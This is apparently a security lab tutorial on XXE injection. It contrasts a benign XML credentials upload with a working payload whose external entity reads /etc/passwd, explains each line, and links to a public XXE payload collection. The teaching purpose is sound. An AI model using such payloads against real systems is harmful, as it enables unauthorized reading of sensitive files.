# 🥋 XXE - External Entities Injection

XXE, or External Entity Injection, is a type of security vulnerability that occurs when an application processes XML input from untrusted sources without proper validation or sanitization. XML (eXtensible Markup Language) is a widely used format for representing structured data.

In XXE attacks, an attacker tries to exploit the ability of XML to include external entities. An external entity is a reference to an external resource, such as a file or a URL, that is pulled into the XML document during parsing. If an application doesn't properly validate or restrict the entities allowed in the XML input, an attacker may craft malicious XML payloads to include external entities that lead to unintended consequences, such as disclosure of sensitive information, remote code execution, or denial of service.

<figure><img src="../../../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

We have an upload form for XML files, we can see the input wanted for the file:

`<creds><user>username</user><password>password</password></creds>`

So technically a file like this would do:

```
┌──(kali㉿kali)-[~/Desktop/labs/user-content]
└─$ cat xxe-safe.xml 
<?xml version="1.0" encoding="UTF-8"?>
<creds>
    <user>testuser</user>
    <password>testpass</password>
</creds>
```

<figure><img src="../../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

so it works and the input is added to the database

now a vulnerable version of this would be :

```
┌──(kali㉿kali)-[~/Desktop/labs/user-content]
└─$ cat xxe-exploit.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```

1. `<?xml version="1.0" encoding="UTF-8"?>`: This declaration indicates that the XML document is in version 1.0 and uses UTF-8 encoding.
2. `<!DOCTYPE creds [`: This marks the beginning of the Document Type Definition (DOCTYPE) for the `creds` element. In this section, external entities are declared.
3. `<!ELEMENT creds ANY >`: This declaration states that the `creds` element can contain any type of child element. This is often used in XXE attacks to allow the inclusion of external entities.
4. `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`: This declaration creates an entity named `xxe` that points to the `/etc/passwd` file on the file system. The `/etc/passwd` file is commonly used as an example because it contains information about system users.
5. `<creds><user>&xxe;</user><password>pass</password></creds>`: In this part, the payload utilizes the external entity `xxe` in the `user` element. Thus, during XML parsing, the processor will attempt to include the content of the `/etc/passwd` file in place of `&xxe;`.

Often you'll go on payload all things for the XXE's but it's good to see how it's interpreted. Try testing out XXE's when encountering JSON uploads [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
